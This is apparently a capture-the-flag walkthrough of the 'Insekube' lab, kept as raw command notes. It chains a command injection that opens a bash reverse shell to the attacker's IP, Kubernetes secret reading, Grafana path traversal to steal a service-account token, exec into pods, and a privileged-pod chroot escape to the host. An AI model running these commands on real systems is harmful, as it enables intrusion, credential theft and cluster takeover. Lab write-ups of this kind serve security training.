# Insekube 

> VOiD | Thursday 24 February 2022 04:32:34 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.204.190

## PORT 80 [http]
```bash
http://10.10.204.190/?hostname=localhost%3Bwhoami
localhost;/bin/bash -c 'bash -i >& /dev/tcp/10.8.253.221/4444 0>&1'

```

## USER [challenge]
```bash
challenge@syringe-79b66d66d7-7mxhd:/$ echo $FLAG
flag{5e7cc6165f6c2058b11710a26691bb6b}

challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get pods
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:syringe" cannot list resource "pods" in API group "" in the namespace "default"

You can check your permissions using kubectl auth can-i --list. The results show this service account can list and get secrets in this namespace


challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]



> Kubernetes Secrets

Kubernetes stores secret values in resources called Secrets these then get mounted into pods either as environment variables or files.

You can use kubectl to list and get secrets. The content of the secret is stored base64 encoded.

challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get secret
NAME                    TYPE                                  DATA   AGE
default-token-8bksk     kubernetes.io/service-account-token   3      48d
developer-token-74lck   kubernetes.io/service-account-token   3      48d
secretflag              Opaque                                1      48d
syringe-token-g85mg     kubernetes.io/service-account-token   3      48d


challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl describe secret secretflag
Name:         secretflag
Namespace:    default
Labels:       <none>
Annotations:  <none>

Type:  Opaque

Data
====
flag:  38 bytes


Challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get secret secretflag -o 'json'
{
    "apiVersion": "v1",
    "data": {
        "flag": "ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0="
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"secretflag\",\"namespace\":\"default\"},\"type\":\"Opaque\"}\n"
        },
        "creationTimestamp": "2022-01-06T23:41:19Z",
        "name": "secretflag",
        "namespace": "default",
        "resourceVersion": "562",
        "uid": "6384b135-4628-4693-b269-4e50bfffdf21"
    },
    "type": "Opaque"
}

echo ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0 | base64 -d      
flag{df2a636de15108a4dc41135d930d8ec1}


curl 10.10.184.119:3000/login > login.h
Grafana v8.3.0-beta2

curl --path-as-is http://10.108.133.228:3000/public/plugins/alertGroups/../../../../../../../../etc/passwd

curl --path-as-is http://10.108.133.228:3000/public/plugins/alertGroups/../../../../../../../../etc/passwd

curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token

./kubectl auth can-i --list --token='eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwMTc4MTI3LCJpYXQiOjE2NDg2NDIxMjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDg2NDU3MzR9LCJuYmYiOjE2NDg2NDIxMjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UX6lIisxS9YX-UXI88Jbpf3ySOTC7_AglzDh6y121cNGJuMOdO_Ex85Lf4DFPN8vMwGVgV8a8PvE__tJ4uljK89DvUiZLFdZPVkXtbJs3kMQ68idJ8aGsZ5XliEsMfIOWEYeeqzKV2pSYQllEop80WbdM38YqJRxLr1yvrIBsA1iml8-6pUOYgKVc-FT7kMRHF_y7fLHOMGmwHu7zrrMnV0xjpQRo0cSR8CUqQQWrDjYfAkOh_HcF53H81UlfswjazMFRgfY9vrjHpahxasgFFWNVYMhp9OnUk4prDhIihT_hL-IBO-xGlrHvW8JXIgt28QMQeheIaoB8SLvZNuBzQ'

./kubectl get pods --token='eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwMTc4MTI3LCJpYXQiOjE2NDg2NDIxMjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDg2NDU3MzR9LCJuYmYiOjE2NDg2NDIxMjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UX6lIisxS9YX-UXI88Jbpf3ySOTC7_AglzDh6y121cNGJuMOdO_Ex85Lf4DFPN8vMwGVgV8a8PvE__tJ4uljK89DvUiZLFdZPVkXtbJs3kMQ68idJ8aGsZ5XliEsMfIOWEYeeqzKV2pSYQllEop80WbdM38YqJRxLr1yvrIBsA1iml8-6pUOYgKVc-FT7kMRHF_y7fLHOMGmwHu7zrrMnV0xjpQRo0cSR8CUqQQWrDjYfAkOh_HcF53H81UlfswjazMFRgfY9vrjHpahxasgFFWNVYMhp9OnUk4prDhIihT_hL-IBO-xGlrHvW8JXIgt28QMQeheIaoB8SLvZNuBzQ'

NAME                       READY   STATUS    RESTARTS       AGE
grafana-57454c95cb-v4nrk   1/1     Running   10 (25d ago)   49d
syringe-79b66d66d7-7mxhd   1/1     Running   1 (25d ago)    25d


./kubectl exec -it grafana-57454c95cb-v4nrk --token='eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwMTc4MTI3LCJpYXQiOjE2NDg2NDIxMjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDg2NDU3MzR9LCJuYmYiOjE2NDg2NDIxMjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UX6lIisxS9YX-UXI88Jbpf3ySOTC7_AglzDh6y121cNGJuMOdO_Ex85Lf4DFPN8vMwGVgV8a8PvE__tJ4uljK89DvUiZLFdZPVkXtbJs3kMQ68idJ8aGsZ5XliEsMfIOWEYeeqzKV2pSYQllEop80WbdM38YqJRxLr1yvrIBsA1iml8-6pUOYgKVc-FT7kMRHF_y7fLHOMGmwHu7zrrMnV0xjpQRo0cSR8CUqQQWrDjYfAkOh_HcF53H81UlfswjazMFRgfY9vrjHpahxasgFFWNVYMhp9OnUk4prDhIihT_hL-IBO-xGlrHvW8JXIgt28QMQeheIaoB8SLvZNuBzQ' -- /bin/bash


./kubectl exec -it everything-allowed-exec-pod --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwMTc4MTI3LCJpYXQiOjE2NDg2NDIxMjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDg2NDU3MzR9LCJuYmYiOjE2NDg2NDIxMjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UX6lIisxS9YX-UXI88Jbpf3ySOTC7_AglzDh6y121cNGJuMOdO_Ex85Lf4DFPN8vMwGVgV8a8PvE__tJ4uljK89DvUiZLFdZPVkXtbJs3kMQ68idJ8aGsZ5XliEsMfIOWEYeeqzKV2pSYQllEop80WbdM38YqJRxLr1yvrIBsA1iml8-6pUOYgKVc-FT7kMRHF_y7fLHOMGmwHu7zrrMnV0xjpQRo0cSR8CUqQQWrDjYfAkOh_HcF53H81UlfswjazMFRgfY9vrjHpahxasgFFWNVYMhp9OnUk4prDhIihT_hL-IBO-xGlrHvW8JXIgt28QMQeheIaoB8SLvZNuBzQ  -- /bin/bash

get serviceaccount

./kubectl get serviceaccount --token='eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwMTc4MTI3LCJpYXQiOjE2NDg2NDIxMjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDg2NDU3MzR9LCJuYmYiOjE2NDg2NDIxMjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UX6lIisxS9YX-UXI88Jbpf3ySOTC7_AglzDh6y121cNGJuMOdO_Ex85Lf4DFPN8vMwGVgV8a8PvE__tJ4uljK89DvUiZLFdZPVkXtbJs3kMQ68idJ8aGsZ5XliEsMfIOWEYeeqzKV2pSYQllEop80WbdM38YqJRxLr1yvrIBsA1iml8-6pUOYgKVc-FT7kMRHF_y7fLHOMGmwHu7zrrMnV0xjpQRo0cSR8CUqQQWrDjYfAkOh_HcF53H81UlfswjazMFRgfY9vrjHpahxasgFFWNVYMhp9OnUk4prDhIihT_hL-IBO-xGlrHvW8JXIgt28QMQeheIaoB8SLvZNuBzQ'

env 
FLAG=flag{288232b2f03b1ec422c5dae50f14061f}



kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

./kubectl apply -f app.yaml --token='eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwMTc4MTI3LCJpYXQiOjE2NDg2NDIxMjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDg2NDU3MzR9LCJuYmYiOjE2NDg2NDIxMjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UX6lIisxS9YX-UXI88Jbpf3ySOTC7_AglzDh6y121cNGJuMOdO_Ex85Lf4DFPN8vMwGVgV8a8PvE__tJ4uljK89DvUiZLFdZPVkXtbJs3kMQ68idJ8aGsZ5XliEsMfIOWEYeeqzKV2pSYQllEop80WbdM38YqJRxLr1yvrIBsA1iml8-6pUOYgKVc-FT7kMRHF_y7fLHOMGmwHu7zrrMnV0xjpQRo0cSR8CUqQQWrDjYfAkOh_HcF53H81UlfswjazMFRgfY9vrjHpahxasgFFWNVYMhp9OnUk4prDhIihT_hL-IBO-xGlrHvW8JXIgt28QMQeheIaoB8SLvZNuBzQ'

./kubectl exec -it lets-allowed-exec-pod --token='eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwMTc4MTI3LCJpYXQiOjE2NDg2NDIxMjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDg2NDU3MzR9LCJuYmYiOjE2NDg2NDIxMjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UX6lIisxS9YX-UXI88Jbpf3ySOTC7_AglzDh6y121cNGJuMOdO_Ex85Lf4DFPN8vMwGVgV8a8PvE__tJ4uljK89DvUiZLFdZPVkXtbJs3kMQ68idJ8aGsZ5XliEsMfIOWEYeeqzKV2pSYQllEop80WbdM38YqJRxLr1yvrIBsA1iml8-6pUOYgKVc-FT7kMRHF_y7fLHOMGmwHu7zrrMnV0xjpQRo0cSR8CUqQQWrDjYfAkOh_HcF53H81UlfswjazMFRgfY9vrjHpahxasgFFWNVYMhp9OnUk4prDhIihT_hL-IBO-xGlrHvW8JXIgt28QMQeheIaoB8SLvZNuBzQ' -- chroot /host bash

root.txt
root@minikube:~# cat root.txt 
flag{30180a273e7da821a7fe4af22ffd1701}

```



